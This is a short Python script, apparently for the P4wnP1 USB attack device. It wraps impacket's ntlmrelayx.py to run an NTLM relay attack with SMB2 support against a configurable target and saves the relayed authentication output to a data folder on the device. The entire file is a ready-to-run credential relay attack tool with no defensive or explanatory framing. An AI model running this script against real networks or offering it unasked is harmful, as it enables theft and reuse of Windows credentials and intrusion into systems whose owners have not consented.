#!/usr/bin/env python3
import os, sys, subprocess, shutil

TARGET = os.environ.get("RELAY_TARGET", "smb://127.0.0.1")

def main():
    binpath = shutil.which("ntlmrelayx.py") or "/usr/bin/ntlmrelayx.py"
    if not os.path.exists(binpath):
        print("[!] ntlmrelayx.py not found. Is impacket-scripts installed?", file=sys.stderr)
        return 1
    # Output prefix in /opt/p4wnp1/data
    os.makedirs("/opt/p4wnp1/data", exist_ok=True)
    args = [binpath, "-tf", "-", "-smb2support", "-of", "/opt/p4wnp1/data/relay"]
    p = subprocess.Popen(args, stdin=subprocess.PIPE)
    p.stdin.write((TARGET+"\n").encode())
    p.stdin.flush()
    p.wait()
    return p.returncode

if __name__ == "__main__":
    sys.exit(main())
